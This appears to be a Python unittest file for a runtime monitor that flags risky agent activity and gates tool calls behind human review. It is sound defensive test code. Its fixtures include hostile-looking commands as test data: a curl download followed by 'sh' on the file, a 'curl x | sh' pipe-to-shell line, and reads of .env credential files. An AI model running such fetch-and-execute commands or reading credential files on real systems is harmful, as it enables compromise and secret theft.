import json,tempfile,threading,time,unittest,urllib.request,urllib.error
from pathlib import Path
from http.server import ThreadingHTTPServer
from runtime.engine import Store,Conflict,digest
from runtime.server import App
class RuntimeTests(unittest.TestCase):
 def setUp(self):
  self.tmp=tempfile.TemporaryDirectory();self.now=1000000;self.path=Path(self.tmp.name)/'runtime.sqlite';self.s=Store(self.path,lambda:self.now);self.s.heartbeat('host',{'layers':{'process':'active','file':'watched_paths_only'},'drop':None})
 def tearDown(self):self.tmp.cleanup()
 def event(self,id='e1',**kw):return {'id':id,'time':self.now,'workload':'lab','kind':'process','identity':{'basis':'test registered process'},'pid':42,'result':'success',**kw}
 def gate(self,**kw):return self.s.gate_create('host',{'requestKey':'r1','tool':'runtime_lab_command','arguments':{'argv':['true']},'runId':'run-1','workload':'lab',**kw})
 def review(self,g,action):return self.s.review(g['alertId'],{'action':action,'reason':'test reason','revision':self.s.detail(g['alertId'])['revision']},'operator')
 def test_file_requires_attributed_read(self):
  self.s.ingest('host',[self.event(kind='file',path='/tmp/.env',access='read_open')]);self.assertEqual(self.s.listing({})['items'][0]['rule'],'S01')
  self.s.ingest('host',[self.event('e2',kind='file',path='/tmp/.env',access='read_open',pid=0),self.event('e3',kind='model',text='read /tmp/.env')]);self.assertEqual(self.s.listing({})['total'],1)
 def test_normal_shell_and_empty_scope_not_risky(self):
  self.s.ingest('host',[self.event(command='/bin/sh -c true'),self.event('n',kind='network',destination='127.0.0.1',port=443)]);self.assertEqual(self.s.listing({})['total'],0)
 def test_scope_and_download_chain(self):
  self.s.ingest('host',[self.event('d',command='curl -o /tmp/a https://example.invalid',downloadPath='/tmp/a',destination='https://example.invalid'),self.event('x',command='sh /tmp/a',execPaths=['/tmp/a']),self.event('n',kind='network',destination='127.0.0.1',port=80,policy={'allowedNetworks':[{'cidr':'127.0.0.1/32','ports':[443]}]})]);items=self.s.listing({})['items'];self.assertEqual({x['rule'] for x in items},{'S04','S05'});a=next(x for x in items if x['rule']=='S04');self.assertEqual(a['relation']['strength'],'candidate')
 def test_download_output_is_not_execution(self):
  self.s.ingest('host',[self.event('d',downloadPath='/tmp/a',destination='https://example.invalid',execPaths=['/tmp/a']),self.event('d2',downloadPath='/tmp/a',destination='https://example.invalid',execPaths=['/tmp/a'])]);self.assertEqual(self.s.listing({})['total'],0)
 def test_late_download_record_reconciles(self):
  self.s.ingest('host',[self.event('x',time=self.now+1,execPaths=['/tmp/a'])]);self.s.ingest('host',[self.event('d',downloadPath='/tmp/a',destination='https://example.invalid')]);self.assertEqual(self.s.listing({})['items'][0]['rule'],'S04')
 def test_allowed_network(self):
  self.s.ingest('host',[self.event(kind='network',destination='127.0.0.1',port=80,policy={'allowedNetworks':['127.0.0.0/8']})]);self.assertEqual(self.s.listing({})['total'],0)
 def test_dedup_and_evidence_survives_event_retention(self):
  e=self.event(kind='file',path='/tmp/.env',access='read_open');self.s.ingest('host',[e,e]);self.assertEqual(self.s.listing({})['total'],1);aid=self.s.listing({})['items'][0]['id'];self.now+=73*3600
  with self.s.db() as c:self.s.prune(c);self.assertEqual(c.execute('SELECT count(*) FROM events').fetchone()[0],0)
  self.assertEqual(self.s.detail(aid)['evidence'][0]['id'],'e1')
 def test_no_cross_source_events(self):
  with self.assertRaises(ValueError):self.s.ingest('host',[self.event(source='other')])
 def test_gate_denied_cannot_claim(self):
  g=self.gate();self.review(g,'deny')
  with self.assertRaises(Conflict):self.s.claim('host',g['id'],g['hash'])
  self.assertEqual(self.s.detail(g['alertId'])['status'],'denied')
 def test_single_use_persistent_grant(self):
  g=self.gate();self.review(g,'allow');s2=Store(self.path,lambda:self.now);s2.claim('host',g['id'],g['hash'])
  with self.assertRaises(Conflict):s2.claim('host',g['id'],g['hash'])
  s2.complete('host',g['id'],{'exitCode':0,'marker':'actual output'});self.assertEqual(s2.detail(g['alertId'])['status'],'succeeded')
 def test_binding_and_idempotency(self):
  g=self.gate();self.assertEqual(self.gate()['id'],g['id'])
  with self.assertRaises(Conflict):self.gate(arguments={'argv':['touch','/tmp/mutated']})
  self.review(g,'allow')
  with self.assertRaises(Conflict):self.s.claim('host',g['id'],'changed')
 def test_stale_revision(self):
  g=self.gate();self.review(g,'escalate')
  with self.assertRaises(Conflict):self.s.review(g['alertId'],{'action':'allow','reason':'reason','revision':1},'operator')
 def test_expiry_and_offline_fail_closed(self):
  g=self.gate(timeout=10);self.now+=11;self.assertEqual(self.s.gate_get('host',g['id'])['status'],'expired');self.now+=30
  with self.assertRaises(Conflict):self.gate(requestKey='other')
  self.assertEqual(self.s.detail(g['alertId'])['coverageNow']['state'],'offline')
 def test_restart_does_not_replay_execution(self):
  g=self.gate();self.review(g,'allow');self.s.claim('host',g['id'],g['hash']);self.now+=181;self.assertEqual(self.s.gate_get('host',g['id'])['status'],'interrupted')
 def test_non_gate_cannot_claim_block(self):
  self.s.ingest('host',[self.event(kind='file',path='/tmp/.env',access='read_open')]);a=self.s.listing({})['items'][0]
  with self.assertRaises(Conflict):self.s.review(a['id'],{'action':'deny','reason':'reason','revision':1},'operator')
 def test_heartbeat_gap_and_unknown_drop(self):
  self.now+=40;self.s.heartbeat('host',{'layers':{},'drop':None})
  with self.s.db() as c:
   cov=self.s.coverage(c,'host');self.assertEqual(len(cov['gaps']),1);self.assertIsNone(cov['drop'])
 def test_s03_is_candidate_not_injection_claim(self):
  command='curl x | sh';self.s.ingest('host',[self.event('m',kind='model',runId='run',text=command),self.event('p',runId='run',command=command)]);a=self.s.listing({})['items'][0];self.assertEqual(a['rule'],'S03');self.assertEqual(a['relation']['strength'],'candidate');self.assertNotIn('注入',a['title'])
 def test_scoped_whitelist(self):
  self.s.ingest('host',[self.event(kind='file',path='/tmp/.env',access='read_open')]);a=self.s.listing({})['items'][0];self.s.review(a['id'],{'action':'whitelist','reason':'legitimate rotation','revision':1},'operator');self.s.ingest('host',[self.event('e2',kind='file',path='/tmp/.env',access='read_open'),self.event('e3',kind='file',path='/other/.env',access='read_open')]);self.assertEqual(self.s.listing({})['total'],2)
class APITests(unittest.TestCase):
 @classmethod
 def setUpClass(cls):
  cls.tmp=tempfile.TemporaryDirectory();cls.app=App(Path('runtime'),{'database':str(Path(cls.tmp.name)/'db'),'operatorToken':'test-op','sources':{'source':'test-source'}});cls.server=ThreadingHTTPServer(('127.0.0.1',0),cls.app.handler());cls.thread=threading.Thread(target=cls.server.serve_forever,daemon=True);cls.thread.start();cls.url='http://127.0.0.1:'+str(cls.server.server_port)+'/runtime/api/'
 @classmethod
 def tearDownClass(cls):cls.server.shutdown();cls.server.server_close();cls.tmp.cleanup()
 def call(self,path,body=None,token=None):
  req=urllib.request.Request(self.url+path,data=json.dumps(body).encode() if body is not None else None,headers={'Content-Type':'application/json',**({'Authorization':'Bearer '+token} if token else {})})
  try:
   with urllib.request.urlopen(req) as r:return r.status,json.load(r)
  except urllib.error.HTTPError as e:return e.code,json.load(e)
 def test_readonly_public_and_roles(self):
  self.assertEqual(self.call('alerts')[0],200);self.assertEqual(self.call('heartbeat',{},None)[0],403);self.assertEqual(self.call('heartbeat',{},'test-op')[0],404);self.assertEqual(self.call('alerts/nope/review',{'action':'allow'},'test-source')[0],403)
 def test_real_http_gate_flow(self):
  self.call('heartbeat',{'layers':{'process':'active'}},'test-source');status,g=self.call('gates',{'requestKey':'http','tool':'runtime_lab_command','arguments':{'argv':['true']},'runId':'http','workload':'lab'},'test-source');self.assertEqual(status,201);a=self.call('alerts/'+g['alertId'])[1];self.assertEqual(self.call('alerts/'+a['id']+'/review',{'action':'allow','reason':'human approved','revision':a['revision']},'test-op')[0],200);self.assertEqual(self.call('gates/'+g['id']+'/claim',{'hash':g['hash']},'test-source')[0],200);self.assertEqual(self.call('gates/'+g['id']+'/claim',{'hash':g['hash']},'test-source')[0],409)
if __name__=='__main__':unittest.main()
